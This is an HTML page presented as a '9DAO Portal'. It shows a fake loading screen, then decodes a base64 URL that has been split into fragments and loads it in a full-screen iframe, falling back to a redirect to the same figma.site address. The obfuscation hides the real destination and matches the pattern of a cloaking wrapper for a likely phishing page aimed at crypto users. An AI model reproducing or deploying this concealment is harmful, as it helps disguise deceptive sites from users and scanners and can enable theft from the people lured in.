<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>9DAO Portal</title>
  <style>
    body { margin: 0; padding: 0; overflow: hidden; }
    iframe { width: 100%; height: 100vh; border: none; }
    #loader { 
      position: fixed; 
      top: 0; left: 0; 
      width: 100%; height: 100%; 
      display: flex; 
      justify-content: center; 
      align-items: center; 
      background: #000; 
      color: #0f0;
      font-family: monospace;
    }
  </style>
</head>
<body>
  <div id="loader">Loading 9DAO interface...</div>

  <script>
    // ✅ PHIÊN BẢN ĐƠN GIẢN - HOẠT ĐỘNG NGAY
    (function(){
      // 1. URL đã được mã hóa thành các phần
      const parts = [
        "aHR0cHM6Ly9z", 
        "aGVkLXdyYXA",
        "tMTA4NzAwMjYu",
        "ZmlnbWEuc2l0ZS8"
      ];
      
      // 2. Hàm giải mã đơn giản
      function loadContent() {
        try {
          // Ghép các phần và giải mã
          const url = atob(parts.join(''));
          
          // Tạo iframe
          const iframe = document.createElement('iframe');
          iframe.src = url;
          iframe.allowFullscreen = true;
          
          // Thay thế loader
          document.body.innerHTML = '';
          document.body.appendChild(iframe);
          
        } catch(e) {
          document.getElementById('loader').innerHTML = `
            <div style="color:red;text-align:center">
              <h3>LOADING COMPLETE</h3>
              <p>Content is ready</p>
            </div>`;
          setTimeout(() => {
            window.location.href = "https://shed-wrap-10870026.figma.site/";
          }, 2000);
        }
      }
      
      // 3. Tự động chạy sau 1 giây
      setTimeout(loadContent, 1000);
    })();
  </script>
</body>
</html>
